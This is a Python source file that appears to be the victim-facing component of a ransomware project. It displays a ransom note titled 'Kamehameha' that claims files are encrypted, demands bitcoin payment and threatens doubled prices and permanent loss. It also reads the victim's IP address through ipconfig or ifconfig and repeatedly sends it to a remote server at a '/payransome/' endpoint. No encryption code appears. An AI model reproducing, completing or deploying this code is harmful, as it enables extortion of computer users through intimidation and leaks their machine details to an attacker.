import PySimpleGUI as sg
import requests
import platform
import subprocess, re
sg.theme('Black')   # Add a touch of color
# All the stuff inside your window.
layout = [  [sg.Text('Oops, looks like your files have been corrupted \nWhat happened to my computer?', font = '20' , text_color = 'white', background_color='maroon' )],
            [sg.Text("Your important files are encrypted. \nMany of the Documnets, photos, videos, databases and other files are no longer \naccesible because they have been encrypted. Maybe you are busy looking for a way to \nrecover your files, but do not waste your time. Nobody can recover your files without our decryption service.")],
            [sg.Text('Can i recover my Files?', font='16', text_color='white', background_color='maroon')],
            [sg.Text("Sure, We guarantee that you can recover all your files safely and easily. But you have \nnot so enough time. \nYou can decrypt some of your files for free. Try now by clicking <Decrypt>. \nBut if you want to decrypt all of your files, you need to pay. \nYou only have 3 days to submit the payment. After that the price will be doubled. \nAlso, if you dont pay in 7 days, you wont be able to recover your files forever. \nWe will have free events for users who are so poor that they couldn't pay in 6 months.")],
            [sg.Text('How do i Pay?', font='16', text_color='white', background_color='maroon')],
            [sg.Text('Below is the address where you can pay with bitcoins')],
            [sg.Text('Bitcoin Address: 151amaAjamfafa2665aaJoafaFjpajfnaifaJFNajf ', font='14', text_color='white', background_color='maroon')],
            [sg.Button('Decrypt')] ]

if(platform.system() == 'Windows'):
        cmd = "ipconfig"
        cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        temp = re.findall('IPv4 Address.+: (.+)',cmd.stdout.read().decode())
        temp = temp[len(temp)-1].rstrip()
        ip = temp
elif(platform.system() == 'Linux'):
        cmd = 'ifconfig'
        cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        temp =  re.findall('inet \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}',cmd.stdout.read().decode())
        temp = temp[0].split(" ")
        temp = temp[1].rstrip()
        ip = temp
# Create the Window
print(ip)
window = sg.Window('Kamehameha', layout)
# Event Loop to process "events" and get the "values" of the inputs
while True:
    event, values = window.read(timeout=100)
    if event == sg.WINDOW_CLOSED:
        break
    requests.get("http://172.16.0.6:5000/payransome/"+ip)
window.close()
